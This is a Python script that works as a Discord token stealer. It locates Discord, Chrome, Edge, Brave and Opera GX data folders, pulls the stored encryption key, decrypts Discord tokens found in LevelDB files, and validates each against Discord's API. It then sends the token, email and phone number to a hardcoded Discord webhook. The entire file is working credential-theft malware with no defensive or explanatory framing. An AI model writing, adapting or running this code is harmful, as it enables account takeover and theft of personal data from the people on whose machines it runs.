from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getenv, listdir, path
from json import loads
from re import findall
import requests

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def send_to_webhook(token, email, phone):
    url = "https://discord.com/api/webhooks/1267444262610665525/HaLxc-nXjxM1mEpSOCwSohe59q_0JVGTBi5hLN_3SC2Pzxg7ArOQ-EZTX2R_f6UwRR7U"  # Replace with your actual webhook URL
    embed = {
        "description": f"**Account Information**\nEmail: `{email}`\nPhone: `{phone}`\n\n**Token**\n`{token}`",
        "title": "Token Information"
    }
    data = {
        "content": "New token information received!",
        "username": "Token",
        "embeds": [embed]
    }
    result = requests.post(url, json=data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(f"Error sending payload: {err}")
    else:
        print(f"Payload delivered successfully, code {result.status_code}.")

def get_token():
    local = getenv('LOCALAPPDATA')
    roaming = getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Chrome': chrome + '\\Default',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    }
    
    for p in paths.values():
        if not path.exists(p): continue
        try:
            with open(p + "\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
        except: continue
        
        for file in listdir(p + "\\Local Storage\\leveldb\\"):
            if not (file.endswith(".ldb") or file.endswith(".log")): continue
            try:
                with open(p + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
                    for x in files.readlines():
                        for token in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x.strip()):
                            try:
                                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                                headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                                res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                                if res.status_code == 200:
                                    res_json = res.json()
                                    email = res_json['email']
                                    phone = res_json['phone']
                                    send_to_webhook(tok, email, phone)
                            except: continue
            except PermissionError: continue

if __name__ == '__main__':
    get_token()
